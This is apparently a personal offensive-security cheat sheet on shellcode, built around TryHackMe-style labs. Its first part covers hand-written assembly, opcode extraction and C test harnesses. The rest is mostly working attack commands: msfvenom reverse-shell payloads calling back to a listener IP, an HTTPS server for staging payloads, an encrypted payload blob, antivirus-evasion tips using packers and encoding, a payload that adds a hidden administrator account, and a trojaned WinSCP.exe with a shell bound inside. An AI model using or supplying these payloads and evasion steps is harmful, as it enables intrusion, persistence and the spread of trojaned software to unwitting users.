### shellcode
## links
https://www.exploit-db.com/search?q=shellcode&type=shellcode&platform=linux_x86-64
http://shell-storm.org/shellcode/
https://tryhackme.com/room/avevasionshellcode


## setreuid + /bin/sh shellcode
SHELL_CODE = pwn.asm(pwn.shellcraft.amd64.linux.setreuid(1155))
SHELL_CODE += pwn.asm(pwn.shellcraft.amd64.linux.sh())



## nasm
nasm -f elf test.asm
nasm -f elf64 test.asm



## example
# thm.asm
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah

# compile and exec
nasm -f elf64 thm.asm
ld thm.o -o thm
./thm



## dump opcode
objdump -d bin



## extract as a shellcode
objcopy -j .text -O binary bin bin.text						# extract opcode
xxd -i bin.text									# show as a C shellcode style



## test extracted shellcode
# test.c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };
    
    (*(void(*)())message)();
    return 0;
}

# compile
gcc -g -Wall -z execstack test.c -o test
./test



## msfvenom shellcode
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c		# will exec calc.exe
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > c.raw	# output as raw
	xxd -i c.raw


## test shellcode for windows
# win-calc.c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}

# compile if for windows
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe



## homemade staged payload
# raw format with windows end 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.98.114 LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
# self signed cartificate
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
# python serve with HTTPS
sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"



## av-evade with custom encoding
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.98.114 LPORT=443 -f csharp
# see /home/tristan/perso/secu/win/weaponization
> csc Encrypter.cs
> .\Encrypter.exe
qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXFTQHJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==
> csc EncStageless.cs
sudo nc -nlvp 443



## packer (UPX, MPRESS, Themida, ConfuserEx,...)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.98.114 LPORT=4444 -f csharp	# gen shellcode
# see /home/tristan/perso/secu/win/weaponization
> csc UnEncStageless.cs
# with ConfuserEx, enable compression, in rule choose maximum preset
# wait 5min after getting the rshell, AV do some in memory check
# after getting the rshell, exec cmd.exe, AV may kill first processs but not the new sub process



## AV evading
# use a smaller payload, just exec a command
msfvenom -p windows/x64/exec CMD='net user USER Password321 /add;net localgroup administrators USER /add' -f csharp



## binding exe with shellcode
# this doesnt fool AV, use: encode+crypt+pack and hide with a binder
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=10.8.98.114 lport=4444 -f exe -o WinSCP-evil.exe







